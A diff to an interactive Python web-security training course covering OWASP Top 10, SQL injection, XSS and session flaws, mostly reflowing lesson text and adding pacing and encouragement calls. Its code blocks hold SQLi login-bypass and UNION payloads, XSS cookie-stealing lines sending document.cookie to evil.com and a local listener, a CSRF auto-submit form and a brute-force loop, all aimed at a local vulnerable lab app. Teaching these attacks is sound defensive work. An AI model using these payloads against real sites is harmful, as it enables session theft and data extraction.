@@ -132,11 +132,15 @@ def lesson_owasp_top10(progress, module_key):
     sub_header("A02:2021 — Cryptographic Failures")
     lesson_block(
         "Previously called 'Sensitive Data Exposure', this category focuses on "
-        "failures related to cryptography — or the lack of it. Common issues "
-        "include transmitting data in cleartext, using deprecated algorithms such "
-        "as MD5 or SHA-1 for password hashing, weak key generation, and missing "
-        "encryption for data at rest."
+        "failures related to cryptography -- or the lack of it."
     )
+    lesson_block(
+        "Common issues include transmitting data in cleartext, using deprecated "
+        "algorithms like MD5 or SHA-1 for password hashing, weak key generation, "
+        "and missing encryption for data at rest."
+    )
+    pace()
+
     code_block(
         "# BAD — storing passwords with MD5\n"
         "import hashlib\n"
@@ -147,6 +151,9 @@ def lesson_owasp_top10(progress, module_key):
         "password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
         "python"
     )
+    pace()
+
+    nice_work("You have covered the top two risks. Keep going!")
 
     press_enter()
 
@@ -155,43 +162,53 @@ def lesson_owasp_top10(progress, module_key):
     lesson_block(
         "Injection flaws occur when untrusted data is sent to an interpreter as "
         "part of a command or query. SQL injection is the most famous example, but "
-        "this category also covers NoSQL injection, OS command injection, and LDAP "
-        "injection. We cover SQL injection in depth in Lesson 2."
+        "this also covers NoSQL injection, OS command injection, and LDAP injection."
     )
+    tip("We cover SQL injection in depth in Lesson 2 of this module.")
+    pace()
 
     # ── A04: Insecure Design ──
     sub_header("A04:2021 — Insecure Design")
     lesson_block(
-        "This is a new category in 2021 that highlights the difference between "
-        "insecure implementation and insecure design. A perfect implementation of "
-        "a bad design is still insecure. Examples include missing rate limiting on "
-        "a password-reset endpoint, a checkout flow that does not re-validate "
-        "prices on the server side, or a security question system that uses easily "
-        "guessable answers."
+        "This category highlights the difference between insecure implementation "
+        "and insecure design. A perfect implementation of a bad design is still "
+        "insecure."
+    )
+    lesson_block(
+        "Examples: missing rate limiting on a password-reset endpoint, a checkout "
+        "flow that does not re-validate prices on the server, or security "
+        "questions with easily guessable answers."
     )
 
+    pace()
     press_enter()
 
     # ── A05: Security Misconfiguration ──
     sub_header("A05:2021 — Security Misconfiguration")
     lesson_block(
         "Misconfiguration is the most commonly seen vulnerability. It includes "
-        "default credentials left unchanged, unnecessary services enabled, "
-        "overly permissive cloud storage buckets, verbose error messages that leak "
-        "stack traces, and missing security headers. Hardening guides and "
-        "automated configuration audits help prevent these issues."
+        "default credentials left unchanged, unnecessary services enabled, and "
+        "overly permissive cloud storage buckets."
     )
+    lesson_block(
+        "Verbose error messages that leak stack traces and missing security "
+        "headers also fall into this category. Hardening guides and automated "
+        "configuration audits help prevent these issues."
+    )
+    pace()
+
+    nice_work("Halfway through the Top 10 -- you are doing great!")
 
     # ── A06: Vulnerable and Outdated Components ──
     sub_header("A06:2021 — Vulnerable and Outdated Components")
     lesson_block(
-        "Using libraries, frameworks, or other software components with known "
-        "vulnerabilities can compromise the entire application. The Log4Shell "
-        "vulnerability (CVE-2021-44228) is a famous example — a single logging "
-        "library flaw led to remote code execution in thousands of applications. "
-        "Keep dependencies updated, use tools like 'pip audit' or 'npm audit', "
-        "and subscribe to security advisories."
+        "Using libraries or frameworks with known vulnerabilities can compromise "
+        "the entire application. The Log4Shell vulnerability (CVE-2021-44228) is "
+        "a famous example -- a single logging library flaw led to remote code "
+        "execution in thousands of apps."
     )
+    tip("Keep dependencies updated. Tools like 'pip audit' and 'npm audit' help.")
+    pace()
 
     press_enter()
 
@@ -200,20 +217,24 @@ def lesson_owasp_top10(progress, module_key):
     lesson_block(
         "Weaknesses in authentication allow attackers to assume other users' "
         "identities. This includes permitting brute-force attacks, accepting weak "
-        "passwords, improper session management, and missing multi-factor "
-        "authentication. Lesson 4 covers this topic in depth."
+        "passwords, and missing multi-factor authentication."
     )
+    tip("Lesson 4 in this module covers authentication in depth.")
+    pace()
 
     # ── A08: Software and Data Integrity Failures ──
     sub_header("A08:2021 — Software and Data Integrity Failures")
     lesson_block(
-        "This category relates to code and infrastructure that does not protect "
-        "against integrity violations. Examples include an application that pulls "
-        "updates from an untrusted source without verification, insecure CI/CD "
-        "pipelines, and auto-update mechanisms that do not validate signatures. "
-        "The SolarWinds attack is a high-profile example — attackers injected "
+        "This category covers code and infrastructure that does not protect "
+        "against integrity violations. Examples: pulling updates from an "
+        "untrusted source, insecure CI/CD pipelines, and auto-update mechanisms "
+        "that do not validate signatures."
+    )
+    lesson_block(
+        "The SolarWinds attack is a high-profile example -- attackers injected "
         "malicious code into a trusted software update."
     )
+    pace()
 
     press_enter()
 
@@ -221,22 +242,29 @@ def lesson_owasp_top10(progress, module_key):
     sub_header("A09:2021 — Security Logging and Monitoring Failures")
     lesson_block(
         "Without proper logging and monitoring, breaches go undetected. Many "
-        "organizations discover breaches months after they occur. Effective "
-        "security logging captures authentication events, access control failures, "
-        "input validation failures, and administrative actions — and feeds them "
-        "into a SIEM or alerting system."
+        "organizations discover breaches months after they occur."
     )
+    lesson_block(
+        "Effective security logging captures authentication events, access "
+        "control failures, input validation failures, and admin actions -- and "
+        "feeds them into a SIEM or alerting system."
+    )
+    pace()
 
     # ── A10: Server-Side Request Forgery (SSRF) ──
     sub_header("A10:2021 — Server-Side Request Forgery (SSRF)")
     lesson_block(
         "SSRF occurs when an application fetches a remote resource based on a "
-        "user-supplied URL without proper validation. An attacker can coerce the "
-        "server into making requests to internal services (e.g., cloud metadata "
-        "endpoints like http://169.254.169.254/), bypassing firewalls and network "
-        "segmentation. Defense includes allowlisting target URLs and blocking "
-        "requests to internal networks."
+        "user-supplied URL without proper validation. An attacker can force the "
+        "server to make requests to internal services."
     )
+    lesson_block(
+        "Defense includes allowlisting target URLs and blocking requests to "
+        "internal networks."
+    )
+    pace()
+
+    nice_work("You have now seen all ten OWASP categories. Excellent progress!")
 
     press_enter()
 
@@ -250,6 +278,7 @@ def lesson_owasp_top10(progress, module_key):
         "Misconfiguration (A05), and Broken Access Control (A01) — demonstrating "
         "how OWASP categories overlap in real breaches."
     )
+    pace()
 
     # ── Practice challenge ──
     sub_header("Practice Challenge")
@@ -277,24 +306,33 @@ def lesson_owasp_top10(progress, module_key):
 
 def lesson_sql_injection(progress, module_key):
     section_header("Lesson 2: SQL Injection")
+    learning_goal([
+        "Understand how SQL injection works",
+        "Learn the different types of SQL injection",
+        "Practice exploiting and fixing SQLi on a local app",
+        "Know how parameterized queries prevent SQLi",
+    ])
     disclaimer()
 
     lesson_block(
         "SQL Injection (SQLi) is one of the oldest and most dangerous web "
-        "vulnerabilities. It occurs when user-supplied input is concatenated "
-        "directly into a SQL query without proper sanitization. An attacker can "
-        "read, modify, or delete data, bypass authentication, and in some cases "
-        "execute operating system commands."
+        "vulnerabilities. It occurs when user input is put directly into a SQL "
+        "query without proper cleanup."
+    )
+    pace()
+
+    lesson_block(
+        "An attacker can read, modify, or delete data, bypass authentication, "
+        "and sometimes even execute operating system commands."
     )
 
     why_it_matters(
         "SQL injection has been behind some of the largest data breaches in "
-        "history, including the 2008 Heartland Payment Systems breach (130 million "
-        "credit card numbers) and the 2015 TalkTalk breach (157,000 customer "
-        "records). Despite being well-understood, it continues to appear because "
+        "history. Despite being well-understood, it keeps appearing because "
         "developers concatenate user input into queries."
     )
 
+    pace()
     press_enter()
 
     # ── How it works ──
@@ -306,8 +344,12 @@ def lesson_sql_injection(progress, module_key):
     code_block(
         '# VULNERABLE CODE — never do this\n'
         'query = f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'"\n'
-        'cursor.execute(query)\n'
-        '\n'
+        'cursor.execute(query)',
+        "sql"
+    )
+    pace()
+
+    code_block(
         '# If the attacker enters this as the username:\n'
         "#   admin' --\n"
         '# The query becomes:\n'
@@ -315,11 +357,15 @@ def lesson_sql_injection(progress, module_key):
         '# The -- comments out the password check, granting access as admin.',
         "sql"
     )
+    pace()
+
     lesson_block(
-        "The core problem is that the database cannot distinguish between the "
-        "query structure and the data. The attacker's input changes the meaning "
-        "of the query itself."
+        "The core problem is that the database cannot tell the difference "
+        "between the query structure and the data. The attacker's input changes "
+        "the meaning of the query itself."
     )
+    tip("Think of it like this: the database treats the attacker's text as commands, not as data.")
+    pace()
 
     press_enter()
 
@@ -328,8 +374,8 @@ def lesson_sql_injection(progress, module_key):
 
     info(f"{BRIGHT}1. Union-Based SQLi{RESET}")
     lesson_block(
-        "The attacker uses the UNION SQL operator to append a second SELECT "
-        "statement to the original query, extracting data from other tables."
+        "The attacker uses the UNION operator to append a second SELECT "
+        "statement, extracting data from other tables."
     )
     code_block(
         "# Original query:\n"
@@ -338,17 +384,15 @@ def lesson_sql_injection(progress, module_key):
         "# Attacker input:\n"
         "#   1' UNION SELECT username, password FROM users --\n"
         "#\n"
-        "# Result: the application displays usernames and password hashes\n"
-        "# alongside product data.",
+        "# Result: usernames and password hashes appear alongside product data.",
         "sql"
     )
+    pace()
 
     info(f"{BRIGHT}2. Error-Based SQLi{RESET}")
     lesson_block(
-        "The attacker intentionally triggers database errors that leak "
-        "information in the error message. For example, injecting a type "
-        "conversion that forces the database to reveal table names or column "
-        "values in the error output."
+        "The attacker triggers database errors that leak information in the "
+        "error message, such as table names or column values."
     )
     code_block(
         "# Attacker input (SQL Server example):\n"
@@ -358,14 +402,14 @@ def lesson_sql_injection(progress, module_key):
         "# fails, and includes the table name in the error message.",
         "sql"
     )
+    pace()
 
     info(f"{BRIGHT}3. Blind SQLi{RESET}")
     lesson_block(
-        "When the application does not display query results or error messages, "
-        "the attacker infers information by observing application behavior. "
-        "Boolean-based blind SQLi asks true/false questions; time-based blind "
-        "SQLi uses delay functions (SLEEP, WAITFOR DELAY) to determine if a "
-        "condition is true."
+        "When the app does not show query results or error messages, the "
+        "attacker infers information by observing behavior. Boolean-based blind "
+        "SQLi asks true/false questions; time-based blind SQLi uses delay "
+        "functions to check if a condition is true."
     )
     code_block(
         "# Boolean-based blind — observe different page responses:\n"
@@ -376,6 +420,8 @@ def lesson_sql_injection(progress, module_key):
         "sql"
     )
 
+    nice_work("You now know the three main types of SQL injection!")
+    pace()
     press_enter()
 
     # ── Hands-on demo against the local vulnerable app ──
@@ -385,10 +431,10 @@ def lesson_sql_injection(progress, module_key):
     print()
 
     lesson_block(
-        "The vulnerable Flask app at http://localhost:5050 has a /login endpoint "
-        "and a /search endpoint that are intentionally vulnerable to SQL injection. "
-        "Below is a Python script that demonstrates exploiting the login bypass."
+        "The vulnerable Flask app has a /login endpoint and a /search endpoint "
+        "that are intentionally vulnerable. Let's exploit the login bypass first."
     )
+    pace()
 
     code_block(
         'import requests\n'
@@ -405,33 +451,47 @@ def lesson_sql_injection(progress, module_key):
         'if "Welcome" in resp.text or resp.status_code == 200:\n'
         '    print("[+] Login bypass successful!")\n'
         'else:\n'
-        '    print("[-] Login bypass failed — the app may be patched.")\n'
-        '\n'
+        '    print("[-] Login bypass failed — the app may be patched.")',
+        "python"
+    )
+    pace()
+
+    lesson_block(
+        "Next, let's try extracting data using a UNION-based injection:"
+    )
+    code_block(
         '# --- Union-Based Data Extraction ---\n'
-        'print("\\n[*] Attempting union-based data extraction...")\n'
+        'print("[*] Attempting union-based data extraction...")\n'
         "sqli_payload = \"' UNION SELECT username, password FROM users --\"\n"
         'resp = requests.get(f"{TARGET}/search", params={"q": sqli_payload})\n'
         'print(f"[+] Response excerpt: {resp.text[:500]}")',
         "python"
     )
+    pace()
 
     press_enter()
 
     # ── Defense: parameterized queries ──
     sub_header("Defense: Parameterized Queries (Prepared Statements)")
     lesson_block(
-        "The primary defense against SQL injection is parameterized queries, also "
-        "called prepared statements. Instead of concatenating user input into the "
-        "query string, you pass the input as separate parameters. The database "
-        "driver ensures the input is always treated as data, never as SQL code."
+        "The primary defense against SQL injection is parameterized queries. "
+        "Instead of concatenating user input into the query, you pass it as "
+        "separate parameters. The database driver ensures the input is always "
+        "treated as data, never as SQL code."
     )
+    pace()
+
     code_block(
         '# VULNERABLE — string concatenation\n'
         'cursor.execute(f"SELECT * FROM users WHERE username=\'{username}\'")\n'
         '\n'
         '# SECURE — parameterized query (sqlite3)\n'
-        'cursor.execute("SELECT * FROM users WHERE username=?", (username,))\n'
-        '\n'
+        'cursor.execute("SELECT * FROM users WHERE username=?", (username,))',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# SECURE — parameterized query (psycopg2 / PostgreSQL)\n'
         'cursor.execute("SELECT * FROM users WHERE username=%s", (username,))\n'
         '\n'
@@ -439,14 +499,17 @@ def lesson_sql_injection(progress, module_key):
         'user = session.query(User).filter(User.username == username).first()',
         "python"
     )
+    pace()
 
     lesson_block(
-        "Additional defenses include: using an ORM (SQLAlchemy, Django ORM), "
-        "applying the principle of least privilege to database accounts, validating "
-        "and sanitizing all input, and using a Web Application Firewall (WAF) as "
-        "a secondary layer."
+        "Additional defenses: use an ORM (SQLAlchemy, Django ORM), apply least "
+        "privilege to database accounts, validate all input, and use a Web "
+        "Application Firewall (WAF) as a secondary layer."
     )
+    tip("Parameterized queries are always the first line of defense -- everything else is a bonus.")
 
+    nice_work("You now understand how to both exploit and defend against SQL injection!")
+    pace()
     press_enter()
 
     # ── Scenario ──
@@ -457,6 +520,7 @@ def lesson_sql_injection(progress, module_key):
         "numbers. The company paid over $145 million in compensation. The attack "
         "began with a simple SQL injection in a public-facing web application."
     )
+    pace()
 
     # ── Practice challenge ──
     sub_header("Practice Challenge: Detect and Fix SQLi")
@@ -486,41 +550,54 @@ def lesson_sql_injection(progress, module_key):
 
 def lesson_xss(progress, module_key):
     section_header("Lesson 3: Cross-Site Scripting (XSS)")
+    learning_goal([
+        "Understand the three types of XSS",
+        "See how attackers use XSS to steal data",
+        "Learn defenses like output encoding and CSP headers",
+    ])
     disclaimer()
 
     lesson_block(
-        "Cross-Site Scripting (XSS) occurs when an application includes untrusted "
-        "data in its web pages without proper validation or escaping. This allows "
-        "attackers to execute arbitrary JavaScript in a victim's browser, enabling "
-        "session hijacking, defacement, phishing, and keylogging."
+        "Cross-Site Scripting (XSS) occurs when an application includes "
+        "untrusted data in its web pages without proper escaping. This lets "
+        "attackers run JavaScript in a victim's browser."
+    )
+    pace()
+
+    lesson_block(
+        "XSS can enable session hijacking, defacement, phishing, and keylogging."
     )
 
     why_it_matters(
-        "XSS is consistently in the OWASP Top 10 and is the most commonly found "
-        "vulnerability in bug bounty programs. A single XSS flaw can lead to "
-        "complete account takeover by stealing session cookies. In 2018, an XSS "
-        "vulnerability in British Airways' website contributed to a breach "
-        "affecting 380,000 payment cards."
+        "XSS is the most commonly found vulnerability in bug bounty programs. "
+        "A single XSS flaw can lead to complete account takeover by stealing "
+        "session cookies."
     )
 
+    pace()
     press_enter()
 
     # ── Types of XSS ──
     sub_header("Type 1: Reflected XSS")
     lesson_block(
-        "Reflected XSS occurs when user input is immediately returned by the "
-        "server in an error message, search result, or any other response that "
-        "includes the input without encoding. The malicious script is part of the "
-        "request (often a crafted URL) and is 'reflected' back to the user."
+        "Reflected XSS happens when user input is immediately echoed back by the "
+        "server without encoding. The malicious script is part of the request "
+        "(often a crafted URL) and is 'reflected' back to the user."
     )
+    pace()
+
     code_block(
         '# Vulnerable Flask route — reflects user input without escaping\n'
         '@app.route("/search")\n'
         'def search():\n'
         '    query = request.args.get("q", "")\n'
         '    # BAD: directly inserting user input into HTML\n'
-        '    return f"<h1>Search results for: {query}</h1>"\n'
-        '\n'
+        '    return f"<h1>Search results for: {query}</h1>"',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# Attacker crafts this URL:\n'
         '# http://localhost:5050/search?q=<script>document.location=\n'
         '#   "http://evil.com/steal?c="+document.cookie</script>\n'
@@ -528,25 +605,34 @@ def lesson_xss(progress, module_key):
         '# When a victim clicks the link, their cookies are sent to evil.com',
         "python"
     )
+    pace()
 
     press_enter()
 
     sub_header("Type 2: Stored (Persistent) XSS")
     lesson_block(
-        "Stored XSS occurs when the malicious payload is permanently saved on the "
-        "target server — for example, in a database, forum post, comment field, or "
-        "user profile. Every user who views the affected page executes the script. "
+        "Stored XSS occurs when the malicious payload is permanently saved on "
+        "the server -- in a database, forum post, comment field, or user profile. "
+        "Every user who views the page executes the script."
+    )
+    lesson_block(
         "This makes stored XSS far more dangerous than reflected XSS because it "
         "does not require tricking a victim into clicking a link."
     )
+    pace()
+
     code_block(
-        '# Vulnerable: storing and rendering user comments without escaping\n'
+        '# Vulnerable: storing and rendering comments without escaping\n'
         '@app.route("/comment", methods=["POST"])\n'
         'def post_comment():\n'
         '    comment = request.form.get("comment")\n'
         '    db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))\n'
-        '    return redirect("/comments")\n'
-        '\n'
+        '    return redirect("/comments")',
+        "python"
+    )
+    pace()
+
+    code_block(
         '@app.route("/comments")\n'
         'def show_comments():\n'
         '    comments = db.execute("SELECT body FROM comments").fetchall()\n'
@@ -556,16 +642,20 @@ def lesson_xss(progress, module_key):
         '    return html',
         "python"
     )
+    pace()
+
+    nice_work("You understand both reflected and stored XSS now!")
 
     press_enter()
 
     sub_header("Type 3: DOM-Based XSS")
     lesson_block(
-        "DOM-based XSS happens entirely in the browser. The vulnerability exists "
-        "in client-side JavaScript that processes user input and inserts it into "
-        "the DOM without sanitization. The server response itself may be perfectly "
-        "safe — the flaw is in how client-side code handles the data."
+        "DOM-based XSS happens entirely in the browser. The flaw is in "
+        "client-side JavaScript that inserts user input into the page without "
+        "sanitization. The server response may be perfectly safe."
     )
+    pace()
+
     code_block(
         '<!-- Vulnerable JavaScript -->\n'
         '<script>\n'
@@ -573,12 +663,18 @@ def lesson_xss(progress, module_key):
         '  var name = document.location.hash.substring(1);\n'
         '  // BAD: inserts it into the page without encoding\n'
         '  document.getElementById("greeting").innerHTML = "Hello, " + name;\n'
-        '</script>\n'
-        '\n'
+        '</script>',
+        "html"
+    )
+    pace()
+
+    code_block(
         '<!-- Attacker URL: -->\n'
         '<!-- http://example.com/page#<img src=x onerror=alert(document.cookie)> -->',
         "html"
     )
+    tip("DOM-based XSS is tricky because it never touches the server -- all the danger is in the browser code.")
+    pace()
 
     press_enter()
 
@@ -594,8 +690,12 @@ def lesson_xss(progress, module_key):
         '<img src=x onerror=alert("XSS")>\n'
         '\n'
         '# SVG-based payload\n'
-        '<svg onload=alert("XSS")>\n'
-        '\n'
+        '<svg onload=alert("XSS")>',
+        "html"
+    )
+    pace()
+
+    code_block(
         '# Bypassing basic filters (case variation)\n'
         '<ScRiPt>alert("XSS")</ScRiPt>\n'
         '\n'
@@ -606,13 +706,16 @@ def lesson_xss(progress, module_key):
         '<script>new Image().src="http://localhost:8888/steal?c="+document.cookie</script>',
         "html"
     )
+    pace()
 
     press_enter()
 
     # ── Hands-on against the vulnerable app ──
     sub_header("Hands-On: XSS Against the Local Vulnerable App")
-    warning("Target ONLY http://localhost:5050 — never test on external sites.")
+    warning("Target ONLY http://localhost:5050 -- never test on external sites.")
     print()
+
+    lesson_block("First, let's test for reflected XSS on the search endpoint:")
     code_block(
         'import requests\n'
         '\n'
@@ -625,10 +728,15 @@ def lesson_xss(progress, module_key):
         'if payload in resp.text:\n'
         '    print("[+] Reflected XSS confirmed — payload rendered without encoding")\n'
         'else:\n'
-        '    print("[-] Payload was encoded or filtered")\n'
-        '\n'
+        '    print("[-] Payload was encoded or filtered")',
+        "python"
+    )
+    pace()
+
+    lesson_block("Now let's check for stored XSS in the comments section:")
+    code_block(
         '# --- Stored XSS test ---\n'
-        'print("\\n[*] Testing stored XSS...")\n'
+        'print("[*] Testing stored XSS...")\n'
         'xss_comment = \'<script>alert("StoredXSS")</script>\'\n'
         'requests.post(f"{TARGET}/comment", data={"comment": xss_comment})\n'
         'resp = requests.get(f"{TARGET}/comments")\n'
@@ -638,17 +746,20 @@ def lesson_xss(progress, module_key):
         '    print("[-] Payload was sanitized or not rendered")',
         "python"
     )
+    pace()
 
     press_enter()
 
     # ── Defenses ──
     sub_header("Defenses Against XSS")
     lesson_block(
-        "The primary defense is output encoding — converting special characters "
-        "like <, >, \", and & into their HTML entity equivalents before rendering "
-        "them in a page. Modern template engines (Jinja2, React, Angular) "
-        "auto-escape output by default."
+        "The primary defense is output encoding -- converting special characters "
+        "like <, >, and & into their HTML entity equivalents before rendering "
+        "them. Modern template engines (Jinja2, React, Angular) auto-escape by "
+        "default."
     )
+    pace()
+
     code_block(
         '# Flask / Jinja2 — auto-escaping is ON by default in templates\n'
         '# In your template (safe):\n'
@@ -657,8 +768,12 @@ def lesson_xss(progress, module_key):
         '\n'
         '# Manual escaping in Python:\n'
         'from markupsafe import escape\n'
-        'safe_input = escape(user_input)\n'
-        '\n'
+        'safe_input = escape(user_input)',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# Content-Security-Policy header to block inline scripts:\n'
         "# Content-Security-Policy: default-src 'self'; script-src 'self'\n"
         '\n'
@@ -666,15 +781,17 @@ def lesson_xss(progress, module_key):
         'response.set_cookie("session", value=token, httponly=True, secure=True)',
         "python"
     )
+    pace()
 
     lesson_block(
         "Defense in depth for XSS: (1) Output encode all user-controlled data. "
-        "(2) Use Content-Security-Policy headers to restrict script sources. "
-        "(3) Set the HttpOnly flag on session cookies. (4) Validate and sanitize "
-        "input on the server side. (5) Use a library like DOMPurify for any "
+        "(2) Use Content-Security-Policy headers. (3) Set HttpOnly on session "
+        "cookies. (4) Validate input server-side. (5) Use DOMPurify for any "
         "client-side HTML rendering."
     )
 
+    nice_work("You now know both the attacks and defenses for XSS!")
+    pace()
     press_enter()
 
     # ── Scenario ──
@@ -687,6 +804,7 @@ def lesson_xss(progress, module_key):
         "spreading virus of all time. This demonstrated how stored XSS can be "
         "weaponized at scale."
     )
+    pace()
 
     # ── Practice challenge ──
     sub_header("Practice Challenge: Find and Fix XSS")
@@ -715,37 +833,43 @@ def lesson_xss(progress, module_key):
 
 def lesson_auth_session(progress, module_key):
     section_header("Lesson 4: Authentication & Session Flaws")
+    learning_goal([
+        "Understand common authentication weaknesses",
+        "Learn about session fixation and CSRF attacks",
+        "Know best practices for secure session management",
+    ])
     disclaimer()
 
     lesson_block(
         "Authentication and session management are the gatekeepers of any web "
-        "application. When these mechanisms are flawed, attackers can compromise "
-        "passwords, keys, or session tokens to impersonate other users. This "
-        "lesson covers broken authentication, session fixation, Cross-Site Request "
-        "Forgery (CSRF), and secure session management practices."
+        "application. When these are flawed, attackers can impersonate other users."
+    )
+    pace()
+
+    lesson_block(
+        "This lesson covers broken authentication, session fixation, Cross-Site "
+        "Request Forgery (CSRF), and secure session management practices."
     )
 
     why_it_matters(
         "Authentication flaws are involved in the majority of account-takeover "
-        "attacks. Credential stuffing attacks (using leaked username/password "
-        "pairs from previous breaches) are automated and run at massive scale. "
-        "Without proper session management, even a strong authentication system "
-        "can be undermined."
+        "attacks. Credential stuffing attacks run at massive scale. Without proper "
+        "session management, even a strong auth system can be undermined."
     )
 
+    pace()
     press_enter()
 
     # ── Broken Authentication ──
     sub_header("Broken Authentication")
     lesson_block(
-        "Broken authentication encompasses a wide range of weaknesses: allowing "
-        "weak passwords, not implementing account lockout after failed attempts, "
-        "exposing session IDs in URLs, not rotating session IDs after login, and "
-        "failing to properly invalidate sessions on logout."
+        "Broken authentication covers a wide range of weaknesses: allowing weak "
+        "passwords, no account lockout after failed attempts, exposing session "
+        "IDs in URLs, and failing to invalidate sessions on logout."
     )
+    pace()
+
     code_block(
-        '# Common broken authentication patterns:\n'
-        '\n'
         '# 1. No rate limiting on login — allows brute-force\n'
         '@app.route("/login", methods=["POST"])\n'
         'def login():\n'
@@ -754,8 +878,12 @@ def lesson_auth_session(progress, module_key):
         '    if user:\n'
         '        session["user_id"] = user.id\n'
         '        return redirect("/dashboard")\n'
-        '    return "Invalid credentials", 401\n'
-        '\n'
+        '    return "Invalid credentials", 401',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# 2. Session ID in URL — can be leaked via Referer header\n'
         '#    http://example.com/dashboard?sessionid=abc123\n'
         '\n'
@@ -765,25 +893,33 @@ def lesson_auth_session(progress, module_key):
         '    return redirect("/login")  # BAD — session still valid!',
         "python"
     )
+    tip("Always check: does logging out actually destroy the session on the server?")
+    pace()
 
     press_enter()
 
     # ── Session Fixation ──
     sub_header("Session Fixation")
     lesson_block(
-        "In a session fixation attack, the attacker sets a victim's session ID to "
-        "a known value before the victim logs in. If the application does not "
-        "regenerate the session ID upon successful authentication, the attacker "
-        "can then use the known session ID to hijack the authenticated session."
+        "In a session fixation attack, the attacker sets a victim's session ID "
+        "to a known value before the victim logs in. If the app does not "
+        "regenerate the session ID after login, the attacker can hijack the "
+        "authenticated session."
     )
+    pace()
+
     code_block(
         '# Session fixation attack flow:\n'
         '# 1. Attacker visits the app, receives session ID: abc123\n'
         '# 2. Attacker tricks victim into using that session:\n'
         '#    http://example.com/login?sessionid=abc123\n'
         '# 3. Victim logs in — the app keeps session ID abc123\n'
-        '# 4. Attacker uses abc123 to access the victim\'s account\n'
-        '\n'
+        '# 4. Attacker uses abc123 to access the victim\'s account',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# DEFENSE: Always regenerate the session ID after login\n'
         'from flask import session\n'
         'import os\n'
@@ -800,17 +936,19 @@ def lesson_auth_session(progress, module_key):
         "python"
     )
 
+    nice_work("You understand session fixation and how to prevent it!")
+    pace()
     press_enter()
 
     # ── CSRF ──
     sub_header("Cross-Site Request Forgery (CSRF)")
     lesson_block(
         "CSRF tricks an authenticated user's browser into submitting a request "
-        "to a web application without the user's knowledge. For example, if a "
-        "user is logged into their bank, a malicious page could trigger a fund "
-        "transfer by submitting a hidden form to the bank's API. The browser "
-        "automatically attaches the user's session cookies to the request."
+        "without the user's knowledge. The browser automatically attaches the "
+        "user's session cookies to the request."
     )
+    pace()
+
     code_block(
         '<!-- Malicious page hosted on evil.com -->\n'
         '<!-- If the victim is logged into bank.com, this form auto-submits -->\n'
@@ -824,21 +962,27 @@ def lesson_auth_session(progress, module_key):
         '</html>',
         "html"
     )
+    pace()
 
     lesson_block(
-        "Defense against CSRF: (1) Use anti-CSRF tokens — a unique, unpredictable "
-        "token included in each form that the server validates on submission. "
-        "(2) Set the SameSite attribute on cookies to 'Strict' or 'Lax'. "
-        "(3) Check the Origin and Referer headers on state-changing requests."
+        "Defense against CSRF: (1) Use anti-CSRF tokens in each form. "
+        "(2) Set the SameSite attribute on cookies. "
+        "(3) Check Origin and Referer headers on state-changing requests."
     )
+    pace()
+
     code_block(
         '# Flask-WTF provides automatic CSRF protection\n'
         'from flask_wtf import FlaskForm, CSRFProtect\n'
         'from wtforms import StringField, SubmitField\n'
         '\n'
         'app.config["SECRET_KEY"] = os.urandom(32)\n'
-        'csrf = CSRFProtect(app)\n'
-        '\n'
+        'csrf = CSRFProtect(app)',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# In your Jinja2 template:\n'
         '# <form method="POST">\n'
         '#   {{ form.hidden_tag() }}   <!-- includes CSRF token -->\n'
@@ -852,6 +996,8 @@ def lesson_auth_session(progress, module_key):
         ')',
         "python"
     )
+    tip("SameSite cookies are one of the easiest CSRF defenses to add -- just one flag!")
+    pace()
 
     press_enter()
 
@@ -863,10 +1009,13 @@ def lesson_auth_session(progress, module_key):
     info("1. Generate session IDs using a cryptographically secure random generator.")
     info("2. Set session cookies with HttpOnly, Secure, and SameSite flags.")
     info("3. Regenerate the session ID after every privilege change (login, role change).")
+    pace()
+
     info("4. Set an appropriate session timeout (idle and absolute).")
     info("5. Invalidate the session completely on logout (server-side deletion).")
     info("6. Store sessions server-side; never trust client-side session data alone.")
     print()
+    pace()
 
     code_block(
         'from flask import Flask, session\n'
@@ -875,8 +1024,12 @@ def lesson_auth_session(progress, module_key):
         '\n'
         'app = Flask(__name__)\n'
         'app.secret_key = os.urandom(32)       # Strong random key\n'
-        'app.permanent_session_lifetime = timedelta(minutes=30)  # Session timeout\n'
-        '\n'
+        'app.permanent_session_lifetime = timedelta(minutes=30)  # Session timeout',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# Secure cookie settings in production\n'
         'app.config.update(\n'
         '    SESSION_COOKIE_HTTPONLY=True,       # No JS access to cookie\n'
@@ -891,12 +1044,16 @@ def lesson_auth_session(progress, module_key):
         "python"
     )
 
+    nice_work("You have a solid grasp of secure session management!")
+    pace()
     press_enter()
 
     # ── Hands-on against the vulnerable app ──
     sub_header("Hands-On: Testing Auth Flaws on the Local Vulnerable App")
     warning("Target ONLY http://localhost:5050")
     print()
+
+    lesson_block("First, let's test if the login has any rate limiting:")
     code_block(
         'import requests\n'
         '\n'
@@ -911,10 +1068,15 @@ def lesson_auth_session(progress, module_key):
         '    if resp.status_code == 200 and "Welcome" in resp.text:\n'
         '        print(f"[+] Password found: {pwd}")\n'
         '        break\n'
-        '    # No delay, no lockout — this is the vulnerability\n'
-        '\n'
+        '    # No delay, no lockout — this is the vulnerability',
+        "python"
+    )
+    pace()
+
+    lesson_block("Next, let's check how the session cookie is configured:")
+    code_block(
         '# --- Check session cookie flags ---\n'
-        'print("\\n[*] Checking session cookie security flags...")\n'
+        'print("[*] Checking session cookie security flags...")\n'
         'session = requests.Session()\n'
         'session.post(f"{TARGET}/login",\n'
         '    data={"username": "admin", "password": "admin"})\n'
@@ -925,6 +1087,7 @@ def lesson_auth_session(progress, module_key):
         '    print(f"    SameSite: {cookie.get_nonstandard_attr(\'SameSite\', \'Not set\')}")',
         "python"
     )
+    pace()
 
     press_enter()
 
@@ -937,6 +1100,7 @@ def lesson_auth_session(progress, module_key):
         "third-party service account. GitHub fixed the issue by properly validating "
         "the state parameter and tying it to the user's session."
     )
+    pace()
 
     # ── Practice challenge ──
     sub_header("Practice Challenge: Audit the Vulnerable App's Auth")
@@ -964,33 +1128,45 @@ def lesson_auth_session(progress, module_key):
 
 def lesson_input_val_headers(progress, module_key):
